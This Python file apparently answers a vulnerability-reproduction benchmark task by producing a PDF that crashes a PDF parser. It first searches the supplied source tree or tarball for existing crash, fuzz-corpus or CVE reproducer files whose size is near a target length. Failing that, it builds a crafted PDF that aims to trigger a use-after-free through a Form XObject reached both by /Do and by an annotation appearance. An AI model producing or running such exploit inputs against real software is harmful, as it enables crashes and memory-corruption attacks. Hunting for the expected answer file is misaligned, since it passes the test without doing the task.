import os
import io
import tarfile
from typing import Optional, Tuple, List


def _is_reproducer_name(name: str) -> bool:
    n = name.lower()
    markers = (
        "poc",
        "crash",
        "repro",
        "reproducer",
        "uaf",
        "use_after_free",
        "use-after-free",
        "asan",
        "ubsan",
        "msan",
        "oss-fuzz",
        "fuzz",
        "corpus",
        "testcase",
        "cve",
        "21604",
    )
    return any(m in n for m in markers)


def _read_file_limited(fp, limit: int) -> Optional[bytes]:
    try:
        data = fp.read(limit + 1)
    except Exception:
        return None
    if data is None:
        return None
    if len(data) > limit:
        return None
    return data


def _maybe_choose_pdf_candidate(name: str, data: bytes, target_len: int) -> Optional[Tuple[int, int, bytes]]:
    if len(data) < 8:
        return None
    if not (data.startswith(b"%PDF-") or data.startswith(b"%FDF-")):
        return None
    n = name.lower()
    if not (_is_reproducer_name(n) or abs(len(data) - target_len) <= 4096):
        return None
    bonus = 0
    if _is_reproducer_name(n):
        bonus += 20000
    if n.endswith(".pdf") or n.endswith(".fdf"):
        bonus += 5000
    if "corpus" in n or "crash" in n:
        bonus += 5000
    score = abs(len(data) - target_len) - bonus
    return (score, len(data), data)


def _scan_tar_for_pdf_candidate(tar_path: str, target_len: int, max_bytes: int = 2_000_000) -> Optional[bytes]:
    best: Optional[Tuple[int, int, bytes]] = None
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf:
                if not m.isreg():
                    continue
                if m.size <= 0 or m.size > max_bytes:
                    continue
                name = m.name
                # Quick name filter to avoid reading tons of irrelevant files
                nl = name.lower()
                if not (_is_reproducer_name(nl) or nl.endswith(".pdf") or nl.endswith(".fdf") or abs(m.size - target_len) <= 4096):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    with f:
                        data = _read_file_limited(f, max_bytes)
                except Exception:
                    continue
                if not data:
                    continue
                cand = _maybe_choose_pdf_candidate(name, data, target_len)
                if cand is None:
                    continue
                if best is None or cand[0] < best[0] or (cand[0] == best[0] and cand[1] < best[1]):
                    best = cand
    except Exception:
        return None
    return None if best is None else best[2]


def _scan_dir_for_pdf_candidate(root: str, target_len: int, max_bytes: int = 2_000_000) -> Optional[bytes]:
    best: Optional[Tuple[int, int, bytes]] = None
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > max_bytes:
                continue
            rel = os.path.relpath(path, root)
            rl = rel.lower()
            if not (_is_reproducer_name(rl) or rl.endswith(".pdf") or rl.endswith(".fdf") or abs(st.st_size - target_len) <= 4096):
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read(max_bytes + 1)
                if len(data) > max_bytes:
                    continue
            except Exception:
                continue
            cand = _maybe_choose_pdf_candidate(rel, data, target_len)
            if cand is None:
                continue
            if best is None or cand[0] < best[0] or (cand[0] == best[0] and cand[1] < best[1]):
                best = cand
    return None if best is None else best[2]


def _pdf_stream(dict_prefix: bytes, stream_data: bytes) -> bytes:
    d = dict_prefix + b" /Length " + str(len(stream_data)).encode("ascii") + b" >>"
    return d + b"\nstream\n" + stream_data + b"\nendstream"


def _build_pdf(objects: List[bytes]) -> bytes:
    out = bytearray()
    out += b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"
    offsets = [0]
    for i, obj in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n".encode("ascii")
        out += obj
        if not obj.endswith(b"\n"):
            out += b"\n"
        out += b"endobj\n"
    xref_pos = len(out)
    out += f"xref\n0 {len(objects) + 1}\n".encode("ascii")
    out += b"0000000000 65535 f \n"
    for off in offsets[1:]:
        out += f"{off:010d} 00000 n \n".encode("ascii")
    out += b"trailer\n"
    out += f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode("ascii")
    out += b"startxref\n"
    out += f"{xref_pos}\n".encode("ascii")
    out += b"%%EOF\n"
    return bytes(out)


def _generate_minimal_uaf_pdf() -> bytes:
    # Create a PDF that forces processing a Form XObject via /Do and also via an annotation appearance stream.
    # The vulnerable code path typically wraps a Dict* from a Stream into an Object without incRef,
    # causing an extra unref when the temporary Object is destroyed.
    form_stream_data = b"q\nQ\n"
    form_stream = _pdf_stream(
        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10] /Resources << >>",
        form_stream_data,
    )

    page_content = b"q\n/Fm0 Do\nQ\n"
    content_stream = _pdf_stream(b"<<", page_content)

    annot = b"<< /Type /Annot /Subtype /Stamp /Rect [10 10 60 60] /F 0 /AP << /N 6 0 R >> >>"
    page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Fm0 6 0 R >> >> /Contents 5 0 R /Annots [4 0 R] >>"
    pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    catalog = b"<< /Type /Catalog /Pages 2 0 R >>"

    objects = [catalog, pages, page, annot, content_stream, form_stream]
    return _build_pdf(objects)


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_len = 33762

        candidate = None
        if src_path and os.path.isdir(src_path):
            candidate = _scan_dir_for_pdf_candidate(src_path, target_len)
        elif src_path and os.path.isfile(src_path):
            candidate = _scan_tar_for_pdf_candidate(src_path, target_len)

        if candidate is not None:
            return candidate

        return _generate_minimal_uaf_pdf()